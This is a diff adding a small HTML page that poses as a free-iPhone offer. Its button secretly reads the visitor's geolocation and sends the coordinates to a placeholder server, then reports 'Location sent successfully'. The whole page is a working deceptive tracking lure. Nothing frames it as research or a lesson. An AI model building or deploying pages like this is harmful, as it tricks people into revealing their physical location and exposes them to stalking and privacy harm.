@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>iphone</title>
+        <link rel="stylesheet" href="style.css">
+
+    <script>
+        function getLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(sendLocation);
+            } else {
+                alert("Geolocation is not supported by this browser.");
+            }
+        }
+
+        function sendLocation(position) {
+            const latitude = position.coords.latitude;
+            const longitude = position.coords.longitude;
+
+            // Construct a URL to send the location to your server or service
+            const url = `https://your-server.com/location?lat=${latitude}&lon=${longitude}`;
+
+            // Send the location via a GET request
+            fetch(url)
+                .then(response => response.text())
+                .then(data => alert("Location sent successfully!"))
+                .catch(error => console.error("Error sending location:", error));
+        }
+    </script>
+</head>
+<body>
+    <h1 id="h1">To get an iphone click the below link</h1>
+    <button onclick="getLocation()" id="btn">click here</button>
+</body>
+</html>
